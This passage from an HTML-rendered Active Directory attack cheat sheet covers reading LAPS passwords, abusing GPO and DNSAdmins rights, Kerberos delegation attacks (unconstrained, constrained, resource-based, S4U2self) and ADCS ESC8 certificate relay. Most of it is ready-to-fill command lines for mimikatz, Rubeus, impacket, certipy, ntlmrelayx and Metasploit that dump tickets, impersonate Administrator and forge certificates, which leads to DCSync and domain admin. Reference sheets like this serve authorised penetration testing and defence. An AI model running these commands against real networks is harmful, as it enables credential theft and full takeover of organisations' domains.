passwords<ul><li>Who can read LAPS</li></ul></p><p>  - `MATCH p=(g:Base)-[:ReadLAPSPassword]-&gt;(c:Computer) RETURN p`<ul><li>Read LAPS &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</li></ul></p><p>  - `Get-LapsADPassword -DomainController &lt;ip_dc&gt; -Credential &lt;domain&gt;\&lt;login&gt; | Format-Table -AutoSize`</p><p>  - `ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; laps`</p><p>  - `foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}`</p><p>  - `nxc ldap &lt;dc_ip&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; --module laps`</p><p>  - `msf&gt; use post/windows/gather/credentials/enum_laps`</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--Get_LAPS_passwords--Who_can_read_LAPS_1187.html"></a><h1 class='title level-4'>Who can read LAPS</h1><br/><p># ACLs/ACEs permissions</p><p>## Get LAPS passwords</p><p>### Who can read LAPS</p><p></p><p>MATCH p=(g:Base)-[:ReadLAPSPassword]-&gt;(c:Computer) RETURN p</p><p></p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--Get_LAPS_passwords--Read_LAPS_1188.html"></a><h1 class='title level-4'>Read LAPS</h1><br/><p># ACLs/ACEs permissions</p><p>## Get LAPS passwords</p><p>### Read LAPS &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>Get-LapsADPassword -DomainController &lt;ip_dc&gt; -Credential &lt;domain&gt;\&lt;login&gt; | Format-Table -AutoSize`</p><p></p><p>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; laps`</p><p></p><p>foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}`</p><p></p><p>nxc ldap &lt;dc_ip&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; --module laps`</p><p></p><p>msf&gt; use post/windows/gather/credentials/enum_laps`</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--GPO_1052.html"></a><h1 class='title level-3'>GPO</h1><br/><p># ACLs/ACEs permissions</p><p></p><p>## GPO<ul><li>Who can control GPOs</li></ul></p><p>  - `MATCH p=((n:Base)-[]-&gt;(gp:GPO)) RETURN p`<ul><li>SID of principals that can create new GPOs in the domain</li></ul></p><p>  - `Get-DomainObjectAcl -SearchBase &quot;CN=Policies,CN=System,DC=blah,DC=com&quot; -ResolveGUIDs  | ? { $_.ObjectAceType -eq &quot;Group-Policy-Container&quot; } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl`<ul><li>Return the principals that can write to the GP-Link attribute on OUs</li></ul></p><p>  - `Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq &quot;GP-Link&quot; -and $_.ActiveDirectoryRights -match &quot;WriteProperty&quot; } | select ObjectDN, SecurityIdentifier | fl`<ul><li>Generic Write on  GPO</li></ul></p><p>  - Abuse GPO &gt;&gt;&gt; ACCESS [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--GPO--Who_can_control_GPOs_1189.html"></a><h1 class='title level-4'>Who can control GPOs</h1><br/><p># ACLs/ACEs permissions</p><p>## GPO</p><p>### Who can control GPOs</p><p></p><p>MATCH p=((n:Base)-[]-&gt;(gp:GPO)) RETURN p</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--GPO--SID_of_principals_that_can_create_new_GPOs_in_the_domain_1190.html"></a><h1 class='title level-4'>SID of principals that can create new GPOs in the domain</h1><br/><p># ACLs/ACEs permissions</p><p>## GPO</p><p>### SID of principals that can create new GPOs in the domain</p><p></p><p>Get-DomainObjectAcl -SearchBase &quot;CN=Policies,CN=System,DC=blah,DC=com&quot; -ResolveGUIDs  | ? { $_.ObjectAceType -eq &quot;Group-Policy-Container&quot; } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--GPO--Return_the_principals_that_can_write_to_the_GP-Link_attribute_on_OUs_1191.html"></a><h1 class='title level-4'>Return the principals that can write to the GP-Link attribute on OUs</h1><br/><p># ACLs/ACEs permissions</p><p>## GPO</p><p>### Return the principals that can write to the GP-Link attribute on OUs</p><p></p><p>Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq &quot;GP-Link&quot; -and $_.ActiveDirectoryRights -match &quot;WriteProperty&quot; } | select ObjectDN, SecurityIdentifier | fl</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--GPO--Generic_Write_on__GPO_1192.html"></a><h1 class='title level-4'>Generic Write on  GPO</h1><br/><p># ACLs/ACEs permissions</p><p>## GPO</p><p>### Generic Write on  GPO</p><p></p><p>Abuse GPO &gt;&gt;&gt; ACCESS [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p></div><div class='page'><a name="Domain_Dominance--ACLs-ACEs_Permissions--DNS_Admin_1053.html"></a><h1 class='title level-3'>DNS Admin</h1><br/><p># ACLs/ACEs permissions</p><p>## DNS Admin</p><p>### DNSadmins abuse (CVE-2021-40469) @CVE@ &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>dnscmd.exe /config /serverlevelplugindll &lt;\\path\to\dll&gt; # need a dnsadmin user</p><p></p><p>sc \\DNSServer stop dns sc \\DNSServer start dns</p></div><div class='page'><a name="Domain_Dominance--Kerberos_Delegation_975.html"></a><h1 class='title level-2'>Kerberos Delegation</h1><br/><p><ul><li><code>findDelegation.py</code>, BloodHound MATCH queries</li></ul></p><p> • <strong>Intent:</strong> Identify unconstrained/constrained delegation accounts.</p><p> • <strong>Purpose:</strong> Find targets for delegation abuse.</p><p><ul><li>Unconstrained delegation (dump tickets with mimikatz/Rubeus)</li></ul></p><p> • <strong>Intent:</strong> Harvest TGTs.</p><p> • <strong>Purpose:</strong> PTT, lateral movement.</p><p><ul><li>Constrained delegation with S4U2self/proxy</li></ul></p><p> • <strong>Intent:</strong> Request delegated tickets.</p><p> • <strong>Purpose:</strong> Impersonate users, gain STs.</p><p><ul><li><code>Rubeus s4u</code>, <code>getST.py</code></li></ul></p><p> • <strong>Intent:</strong> Abuse constrained delegation to impersonate admin.</p><p> • <strong>Purpose:</strong> Obtain TGS → crack or lateral.</p><p><ul><li>RBCD with new computer account (<code>rbcd.py</code>)</li></ul></p><p> • <strong>Intent:</strong> Abuse msDS-AllowedToActOnBehalf.</p><p> • <strong>Purpose:</strong> Impersonate privileged accounts.</p><p><ul><li>Resource-based delegation with Rubeus or rbcd.py</li></ul></p><p> • <strong>Intent:</strong> Configure RBCD entries for persistence.</p><p> • <strong>Purpose:</strong> Impersonate admin to escalate.</p><p><ul><li>S4U2self abuse (<code>getTGT.py</code>, <code>getST.py</code>)</li></ul></p><p> • <strong>Intent:</strong> Forge tickets.</p><p> • <strong>Purpose:</strong> Admin access.</p><p></p></div><div class='page'><a name="Domain_Dominance--Kerberos_Delegation--Find_delegation_1055.html"></a><h1 class='title level-3'>Find delegation</h1><br/><p># Kerberos Delegation</p><p>## Find delegation</p><p></p><p>findDelegation.py &quot;&lt;domain&gt;&quot;/&quot;&lt;user&gt;&quot;:&quot;&lt;password&gt;&quot;</p></div><div class='page'><a name="Domain_Dominance--Kerberos_Delegation--Find_delegation--With_BloodHound_1193.html"></a><h1 class='title level-4'>With BloodHound</h1><br/><p># Kerberos Delegation</p><p>## Find delegation</p><p>### With BloodHound</p><p>  - Unconstrained</p><p>    - `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c`</p><p>    - `MATCH (c:User {unconstraineddelegation:true}) RETURN c`</p><p>  - Constrained</p><p>    - `MATCH p=((c:Base)-[:AllowedToDelegate]-&gt;(t:Computer)) RETURN p`</p><p>    - `MATCH p=shortestPath((u:User)-[*1..]-&gt;(c:Computer {name: &quot;&lt;MYTARGET.FQDN&gt;&quot;})) RETURN p`</p></div><div class='page'><a name="Domain_Dominance--Kerberos_Delegation--Find_delegation--With_BloodHound--Unconstrained_1194.html"></a><h1 class='title level-5'>Unconstrained</h1><br/><p># Kerberos Delegation</p><p>## Find delegation</p><p>### With BloodHound</p><p>#### Unconstrained</p><p>  </p><p>MATCH (c:Computer {unconstraineddelegation:true}) RETURN c</p><p></p><p>MATCH (c:User {unconstraineddelegation:true}) RETURN c</p></div><div class='page'><a name="Domain_Dominance--Kerberos_Delegation--Find_delegation--With_BloodHound--Constrained_1195.html"></a><h1 class='title level-5'>Constrained</h1><br/><p># Kerberos Delegation</p><p>## Find delegation</p><p>### With BloodHound</p><p>#### Constrained</p><p></p><p>MATCH p=((c:Base)-[:AllowedToDelegate]-&gt;(t:Computer)) RETURN p</p><p></p><p>MATCH p=shortestPath((u:User)-[*1..]-&gt;(c:Computer {name: &quot;&lt;MYTARGET.FQDN&gt;&quot;})) RETURN p</p></div><div class='page'><a name="Domain_Dominance--Kerberos_Delegation--Unconstrained_delegation_1056.html"></a><h1 class='title level-3'>Unconstrained delegation</h1><br/><p># Kerberos Delegation</p><p>## Unconstrained delegation &gt;&gt;&gt; Kerberos TGT [<a href="#Domain_Dominance--Lateral_Movement--Kerberos_1089.html">Kerberos</a>] &gt;&gt;&gt; PassTheTicket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>]</p><p></p><p>UAC: ADS_UF_TRUSTED_FOR_DELEGATION</p><p></p><p>&gt;&gt;	Force connection  with coerce</p><p></p><p>	&gt;&gt;	Get tickets </p><p>				</p><p>				mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export</p><p>			</p><p>				Rubeus.exe dump /service:krbtgt /nowrap</p><p>				</p><p>				Rubeus.exe dump /luid:0xdeadbeef /nowrap</p><p>	</p><p>				Rubeus.exe monitor /interval:5</p></div><div class='page'><a name="Domain_Dominance--Kerberos_Delegation--Unconstrained_delegation--UAC_ADS_UF_TRUSTED_FOR_DELEGATION_1196.html"></a><h1 class='title level-4'>UAC: ADS_UF_TRUSTED_FOR_DELEGATION</h1><br/><p># Kerberos Delegation</p><p>## Unconstrained delegation &gt;&gt;&gt; Kerberos TGT [<a href="#Domain_Dominance--Lateral_Movement--Kerberos_1089.html">Kerberos</a>] &gt;&gt;&gt; PassTheTicket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>]</p><p>### UAC: ADS_UF_TRUSTED_FOR_DELEGATION</p><p></p><p>Force connection  with coerce</p><p>&gt;&gt;	Get tickets </p><p>	&gt;&gt;			</p><p>			mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export</p><p>			</p><p>			Rubeus.exe dump /service:krbtgt /nowrap</p><p>				</p><p>			Rubeus.exe dump /luid:0xdeadbeef /nowrap</p><p>	</p><p>			Rubeus.exe monitor /interval:5</p><p>			</p><p>&gt;&gt;&gt; Kerberos TGT [<a href="#Domain_Dominance--Lateral_Movement--Kerberos_1089.html">Kerberos</a>] &gt;&gt;&gt; PassTheTicket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>]</p></div><div class='page'><a name="Domain_Dominance--Kerberos_Delegation--Constrained_delegation_1057.html"></a><h1 class='title level-3'>Constrained delegation</h1><br/><p># Kerberos Delegation</p><p>## Constrained delegation<ul><li>With protocol transition (any) UAC: TRUST_TO_AUTH_FOR_DELEGATION</li></ul></p><p>  - Get TGT for user</p><p>    - Request S4u2self<ul><li>Request S4u2proxy</li></ul></p><p>  - `Rubeus.exe hash /password:&lt;password&gt;`</p><p>    - `Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;AES 256 hash&gt;`<ul><li>`Rubeus.exe s4u /ticket:&lt;ticket&gt; /impersonateuser:&lt;admin_user&gt; /msdsspn:&lt;spn_constrained&gt; /altservice:&lt;altservice&gt; /ptt`</li></ul></p><p>        - Altservice HTTP/HOST/CIFS/LDAP  &gt;&gt;&gt; Kerberos TGS [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p>  - `getST.py -spn &#39;&lt;spn&gt;/&lt;target&gt;&#39; -impersonate Administrator -dc-ip &#39;&lt;dc_ip&gt;&#39; &#39;&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;&#39; -altservice &lt;altservice&gt;`</p><p>    - Altservice HTTP/HOST/CIFS/LDAP &gt;&gt;&gt; Kerberos TGS [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p><ul><li>Without protocol transition (kerberos only) UAC: TRUSTED_FOR_DELEGATION</li></ul></p><p>  - Constrain between Y and Z</p><p>    - Add computer X<ul><li>Add RBCD : delegate from X to Y</li></ul></p><p>        - s4u2self X (impersonate admin)</p><p>          - S4u2Proxy X (impersonate admin on spn/Y)<ul><li>Forwardable TGS for Y</li></ul></p><p>              - S4u2Proxy Y (impersonate admin on spn/Z) </p><p>  - add computer account</p><p>    - `addcomputer.py -computer-name &#39;&lt;computer_name&gt;&#39; -computer-pass &#39;&lt;ComputerPassword&gt;&#39; -dc-host &lt;dc&gt; -domain-netbios &lt;domain_netbios&gt; &#39;&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;&#39;`</p><p>  - RBCD With added computer account &gt;&gt;&gt; Kerberos TGS [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p>    - `rbcd.py -delegate-from &#39;&lt;rbcd_con&gt;$&#39; -delegate-to &#39;&lt;constrained&gt;$&#39; -dc-ip &#39;&lt;dc&gt;&#39; -action &#39;write&#39; -hashes &#39;&lt;hash&gt;&#39; &lt;domain&gt;/&lt;constrained&gt;$`<ul><li>`getST.py -spn host/&lt;constrained&gt; -impersonate Administrator --dc-ip &lt;dc_ip&gt; &#39;&lt;domain&gt;/&lt;rbcd_con&gt;$:&lt;rbcd_conpass&gt;&#39;`</li></ul></p><p>        - `getST.py -spn &lt;constrained_spn&gt;/&lt;target&gt; -hashes &#39;&lt;hash&gt;&#39; &#39;&lt;domain&gt;/&lt;constrained&gt;$&#39; -impersonate Administrator --dc-ip &lt;dc_ip&gt; -additional-ticket &lt;previous_ticket&gt;`</p><p>  - Self RBCD @CVE@</p><p>    - Like RBCD without add computer</p></div><div class='page'><a name="Domain_Dominance--Kerberos_Delegation--Constrained_delegation--With_protocol_transition_(any)_UAC_TRUST_TO_AUTH_FOR_DELEGATION_1197.html"></a><h1 class='title level-4'>With protocol transition (any) UAC: TRUST_TO_AUTH_FOR_DELEGATION</h1><br/><p># Kerberos Delegation</p><p>## Constrained delegation</p><p>### With protocol transition (any) UAC: TRUST_TO_AUTH_FOR_DELEGATION</p><p></p><p>Get TGT for user</p><p>&gt;&gt;	Request S4u2self</p><p>    &gt;&gt;	Request S4u2proxy</p><p></p><p>Rubeus.exe hash /password:&lt;password&gt;</p><p>&gt;&gt;	Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;AES 256 hash&gt;</p><p>	&gt;&gt;	Rubeus.exe s4u /ticket:&lt;ticket&gt; /impersonateuser:&lt;admin_user&gt; /msdsspn:&lt;spn_constrained&gt; /altservice:&lt;altservice&gt; /ptt</p><p>		&gt;&gt;	Altservice HTTP/HOST/CIFS/LDAP  &gt;&gt;&gt; Kerberos TGS [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p>		</p><p>getST.py -spn &#39;&lt;spn&gt;/&lt;target&gt;&#39; -impersonate Administrator -dc-ip &#39;&lt;dc_ip&gt;&#39; &#39;&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;&#39; -altservice &lt;altservice&gt;</p><p>&gt;&gt;	Altservice HTTP/HOST/CIFS/LDAP &gt;&gt;&gt; Kerberos TGS [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a></p></div><div class='page'><a name="omain_Dominance--Kerberos_Delegation--Constrained_delegation--Without_protocol_transition_(kerberos_only)_UAC_TRUSTED_FOR_DELEGATION_1198.html"></a><h1 class='title level-4'>Without protocol transition (kerberos only) UAC: TRUSTED_FOR_DELEGATION</h1><br/><p># Kerberos Delegation</p><p>## Constrained delegation</p><p>### Without protocol transition (kerberos only) UAC: TRUSTED_FOR_DELEGATION</p><p></p><p>Constrain between Y and Z</p><p>&gt;&gt;	Add computer X</p><p>    &gt;&gt;	Add RBCD : delegate from X to Y</p><p>		&gt;&gt;	s4u2self X (impersonate admin)</p><p>			&gt;&gt;	S4u2Proxy X (impersonate admin on spn/Y)</p><p>				&gt;&gt;	Forwardable TGS for Y</p><p>				&gt;&gt;	S4u2Proxy Y (impersonate admin on spn/Z) </p><p></p><p>Add computer account</p><p>&gt;&gt;	addcomputer.py -computer-name &#39;&lt;computer_name&gt;&#39; -computer-pass &#39;&lt;ComputerPassword&gt;&#39; -dc-host &lt;dc&gt; -domain-netbios &lt;domain_netbios&gt; &#39;&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;&#39;</p><p></p><p>RBCD With added computer account</p><p>&gt;&gt;	rbcd.py -delegate-from &#39;&lt;rbcd_con&gt;$&#39; -delegate-to &#39;&lt;constrained&gt;$&#39; -dc-ip &#39;&lt;dc&gt;&#39; -action &#39;write&#39; -hashes &#39;&lt;hash&gt;&#39; &lt;domain&gt;/&lt;constrained&gt;$</p><p>	&gt;&gt;	getST.py -spn host/&lt;constrained&gt; -impersonate Administrator --dc-ip &lt;dc_ip&gt; &#39;&lt;domain&gt;/&lt;rbcd_con&gt;$:&lt;rbcd_conpass&gt;&#39;</p><p>  		&gt;&gt;	getST.py -spn &lt;constrained_spn&gt;/&lt;target&gt; -hashes &#39;&lt;hash&gt;&#39; &#39;&lt;domain&gt;/&lt;constrained&gt;$&#39; -impersonate Administrator --dc-ip &lt;dc_ip&gt; -additional-ticket &lt;previous_ticket&gt; &gt;&gt;&gt; Kerberos TGS [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p>  </p><p>Self RBCD @CVE@</p><p>&gt;&gt;	Like RBCD without add computer</p></div><div class='page'><a name="Domain_Dominance--Kerberos_Delegation--Resource-Based_Constrained_Delegation_1058.html"></a><h1 class='title level-3'>Resource-Based Constrained Delegation</h1><br/><p># Kerberos Delegation</p><p></p><p>## Resource-Based Constrained Delegation<ul><li>add computer account</li></ul></p><p>  - `addcomputer.py -computer-name &#39;&lt;computer_name&gt;&#39; -computer-pass &#39;&lt;ComputerPassword&gt;&#39; -dc-host &lt;dc&gt; -domain-netbios &lt;domain_netbios&gt; &#39;&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;&#39;`<ul><li>RBCD With added computer account</li></ul></p><p>  - `Rubeus.exe hash /password:&lt;computer_pass&gt; /user:&lt;computer&gt; /domain:&lt;domain&gt;`</p><p>    - `Rubeus.exe s4u /user:&lt;fake_computer$&gt; /aes256:&lt;AES 256 hash&gt; /impersonateuser:administrator /msdsspn:cifs/&lt;victim.domain.local&gt; /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt` &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p>  - `rbcd.py -delegate-from &#39;&lt;computer&gt;$&#39; -delegate-to &#39;&lt;target&gt;$&#39; -dc-ip &#39;&lt;dc&gt;&#39; -action &#39;write&#39; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;`</p><p>    - `getST.py -spn host/&lt;dc_fqdn&gt; &#39;&lt;domain&gt;/&lt;computer_account&gt;:&lt;computer_pass&gt;&#39; -impersonate Administrator --dc-ip &lt;dc_ip&gt;` &gt;&gt;&gt; Kerberos TGT [<a href="#Domain_Dominance--Lateral_Movement--Kerberos_1089.html">Kerberos</a>] &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p></div><div class='page'><a name="Domain_Dominance--Kerberos_Delegation--Resource-Based_Constrained_Delegation--Add_computer_account_1199.html"></a><h1 class='title level-4'>Add computer account</h1><br/><p># Kerberos Delegation</p><p>## Resource-Based Constrained Delegation</p><p>### Add computer account</p><p></p><p>addcomputer.py -computer-name &#39;&lt;computer_name&gt;&#39; -computer-pass &#39;&lt;ComputerPassword&gt;&#39; -dc-host &lt;dc&gt; -domain-netbios &lt;domain_netbios&gt; &#39;&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;&#39;</p></div><div class='page'><a name="Domain_Dominance--Kerberos_Delegation--Resource-Based_Constrained_Delegation--RBCD_With_added_computer_account_1200.html"></a><h1 class='title level-4'>RBCD With added computer account</h1><br/><p># Kerberos Delegation</p><p>## Resource-Based Constrained Delegation</p><p>### RBCD With added computer account</p><p></p><p>Rubeus.exe hash /password:&lt;computer_pass&gt; /user:&lt;computer&gt; /domain:&lt;domain&gt;</p><p>&gt;&gt;	Rubeus.exe s4u /user:&lt;fake_computer$&gt; /aes256:&lt;AES 256 hash&gt; /impersonateuser:administrator /msdsspn:cifs/&lt;victim.domain.local&gt; /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p><p></p><p>rbcd.py -delegate-from &#39;&lt;computer&gt;$&#39; -delegate-to &#39;&lt;target&gt;$&#39; -dc-ip &#39;&lt;dc&gt;&#39; -action &#39;write&#39; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;</p><p>&gt;&gt;	getST.py -spn host/&lt;dc_fqdn&gt; &#39;&lt;domain&gt;/&lt;computer_account&gt;:&lt;computer_pass&gt;&#39; -impersonate Administrator --dc-ip &lt;dc_ip&gt;` &gt;&gt;&gt; Kerberos TGT [<a href="#Domain_Dominance--Lateral_Movement--Kerberos_1089.html">Kerberos</a>] &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p></div><div class='page'><a name="Domain_Dominance--Kerberos_Delegation--S4U2self_abuse_1059.html"></a><h1 class='title level-3'>S4U2self abuse</h1><br/><p># Kerberos Delegation</p><p>## S4U2self abuse</p><p></p><p>Get machine account (X)&#39;s TGT</p><p>&gt;&gt;	 Get a ST on X as user admin</p><p></p><p>getTGT.py -dc-ip &quot;&lt;dc_ip&gt;&quot; -hashes :&quot;&lt;machine_hash&gt;&quot; &quot;&lt;domain&gt;&quot;/&quot;&lt;machine&gt;$&quot;</p><p>&gt;&gt;	getST.py -self -impersonate &quot;&lt;admin&gt;&quot; -altservice &quot;cifs/&lt;machine&gt;&quot; -k -no-pass -dc-ip &quot;DomainController&quot; &quot;&lt;domain&gt;&quot;/&#39;&lt;machine&gt;$&#39; &gt;&gt;&gt; Admin [<a href="#Domain_Dominance--Admin_Access_978.html">Admin Access</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS_976.html"></a><h1 class='title level-2'>ADCS</h1><br/><p><ul><li><code>certutil -v -dsTemplate</code>, <code>certipy find ...</code></li></ul></p><p> • <strong>Intent:</strong> Enumerate certificate templates, CA, and PKI objects.</p><p> • <strong>Purpose:</strong> Identify vulnerable ADCS configuration.</p><p><ul><li><code>ntlmrelayx.py ... --adcs</code> with Rubeus/gettgtpkinit</li></ul></p><p> • <strong>Intent:</strong> Relay NTLM to ADCS HTTP enrollment.</p><p> • <strong>Purpose:</strong> Issue certs for DC accounts → elevate to Domain Admin.</p><p><ul><li>ESC1–ESC3, ESC13, ESC15 <code>certipy req</code>/<code>certify.exe request</code></li></ul></p><p> • <strong>Intent:</strong> Request certs from misconfigured templates.</p><p> • <strong>Purpose:</strong> Abuse template misconfigurations for impersonation / PTT.</p><p><ul><li>ESC4, ESC7 <code>certipy template</code> / <code>certipy ca</code></li></ul></p><p> • <strong>Intent:</strong> Abuse ACLs on templates or CA objects.</p><p> • <strong>Purpose:</strong> Modify templates or CA to issue arbitrary certs.</p><p><ul><li>ESC5 <code>certipy ca -backup ... forge</code></li></ul></p><p> • <strong>Intent:</strong> Backup CA private key, forge cert.</p><p> • <strong>Purpose:</strong> Golden certificate → persist domain admin rights.</p><p><ul><li>ESC6, ESC11</li></ul></p><p> • <strong>Intent:</strong> Abuse CA flags or RPC relay.</p><p> • <strong>Purpose:</strong> Issue unauthorized certs → PTT → DCSync.</p><p><ul><li>ESC9/ESC10, ESC14</li></ul></p><p> • <strong>Intent:</strong> Abuse mapping features to escalate via account updates.</p><p> • <strong>Purpose:</strong> Impersonate privileged accounts with certs.</p><p></p></div><div class='page'><a name="Domain_Dominance--ADCS--Enumeration_1060.html"></a><h1 class='title level-3'>Enumeration</h1><br/><p># ADCS</p><p>## Enumeration &gt;&gt;&gt; Web enrollment [<a href="#Domain_Dominance--ADCS--Web_Enrollment_Is_Up_1061.html">Web Enrollment Is Up</a>] || Vulnerable template [<a href="#Domain_Dominance--ADCS--Misconfigured_Certificate_Template_1062.html">Misconfigured Certificate Template</a>] || Vulnerable CA [<a href="#Domain_Dominance--ADCS--Misconfigured_Certificate_Authority_1065.html">Misconfigured Certificate Authority</a>] || Misconfigured ACL [<a href="#Domain_Dominance--ADCS--Misconfigured_ACL_1063.html">Misconfigured ACL</a>] || Vulnerable PKI Object AC [<a href="#Domain_Dominance--ADCS--Vulnerable_PKI_Object_access_control_1064.html">Vulnerable PKI Object access control</a>]</p><p></p><p>certutil -v -dsTemplate</p><p></p><p>certify.exe find [ /vulnerable]</p><p></p><p>certipy find -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -dc-ip &lt;dc_ip&gt;</p><p></p><p>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s &lt;dc_ip&gt; templates</p><p></p><p>Get PKI objects information</p><p>&gt;&gt;	certify.exe pkiobjects</p><p></p><p>Display CA information</p><p>&gt;&gt;	certutil -TCAInfo</p><p>&gt;&gt;	certify.exe cas</p></div><div class='page'><a name="Domain_Dominance--ADCS--Web_Enrollment_Is_Up_1061.html"></a><h1 class='title level-3'>Web Enrollment Is Up</h1><br/><p># ADCS</p><p>## Web Enrollment Is Up &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]<ul><li>ESC8 &gt;&gt;&gt; Pass the ticket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>] &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>] || LDAP shell [<a href="#Domain_Dominance--Lateral_Movement--Clear_text_Password_1087.html">Clear text Password</a>]</li></ul></p><p>  - `ntlmrelayx.py -t <a href="http://">http://</a>&lt;dc_ip&gt;/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController`</p><p>    - `Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt`</p><p>    - `gettgtpkinit.py -pfx-base64 $(cat cert.b64) &lt;domain&gt;/&lt;dc_name&gt;$ &lt;ccache_file&gt;`</p><p>  - `certipy relay -target <a href="http://">http://</a>&lt;ip_ca&gt;`</p><p>    - `certipy auth -pfx &lt;certificate&gt; -dc-ip &lt;dc_ip&gt;`</p></div><div class='page'><a name="Domain_Dominance--ADCS--Web_Enrollment_Is_Up--ESC8_1201.html"></a><h1 class='title level-4'>ESC8</h1><br/><p># ADCS</p><p>## Web Enrollment Is Up &gt;&gt;&gt; Domain admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]</p><p>### ESC8 &gt;&gt;&gt; Pass the ticket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>] &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>] || LDAP shell [<a href="#Domain_Dominance--Lateral_Movement--Clear_text_Password_1087.html">Clear text Password</a>]</p><p></p><p>ntlmrelayx.py -t <a href="http://">http://</a>&lt;dc_ip&gt;/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController</p><p>&gt;&gt;	Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt</p><p>&gt;&gt;	gettgtpkinit.py -pfx-base64 $(cat cert.b64) &lt;domain&gt;/&lt;dc_name&gt;$ &lt;ccache_file&gt;</p><p></p><p>certipy relay -target <a href="http://">http://</a>&lt;ip_ca&gt;</p><p>&gt;&gt;	certipy auth -pfx &lt;certificate&gt; -dc-ip &lt;dc_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_Certificate_Template_1062.html"></a><h1 class='title level-3'>Misconfigured Certificate 